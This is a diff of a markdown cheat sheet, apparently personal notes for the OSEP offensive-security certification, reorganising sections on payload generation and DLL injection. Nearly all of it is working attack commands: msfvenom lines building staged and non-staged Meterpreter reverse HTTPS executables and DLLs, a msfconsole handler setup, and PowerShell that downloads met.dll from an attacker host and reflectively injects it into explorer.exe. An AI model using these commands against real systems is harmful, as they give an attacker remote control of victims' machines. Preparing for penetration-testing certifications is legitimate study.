@@ -1,8 +1,8 @@
 # OSEP-Survival Joruney: Complete Guide
 
-## Reverse Shell Handler 
+## Payload Generation
 
-### Metasploit Payload Generation
+### Staged
 ```
 #Staged
 sudo msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.45.221 LPORT=443 -f exe -o ./msfstaged.exe
@@ -17,21 +17,31 @@ msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.119.120 LPORT=443 EX
 sudo msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.119.120 LPORT=443 -f dll -o /var/www/html/met.dll
 ```
 
-### Metasploit Basic handler
+### Non-staged
+```
+#exe
+sudo msfvenom -p windows/x64/meterpreter_reverse_https LHOST=192.168.45.221 LPORT=443 -f exe -o ./msfnonstaged.exe
+```
+
+## MSFConsole
 ```
 sudo msfconsole -q
 set payload windows/x64/meterpreter/reverse_https
 set lhost 192.168.45.221
 ```
 
-### DLL Injection
+## DLL Injection
+
+### Load On-Disk DLL into Memory
 ```
 #Load DLL into bytes
 $filePath = "C:\Path\To\YourFile.dll"
 $bytes = Get-Content -Path $filePath -Encoding Byte -ReadCount 0
+```
 
-#Reflective DLL Injection
-$bytes = (New-Object System.Net.WebClient).DownloadData('http://192.168.119.120/met.dll')
+### Reflective DLL Injection
+```
+$bytes = (New-Object System.Net.WebClient).DownloadData('http://192.168.45.188/met.dll')
 $procid = (Get-Process -Name explorer).Id
 Import-Module C:\Tools\Invoke-ReflectivePEInjection.ps1
 Invoke-ReflectivePEInjection -PEBytes $bytes -ProcId $procid
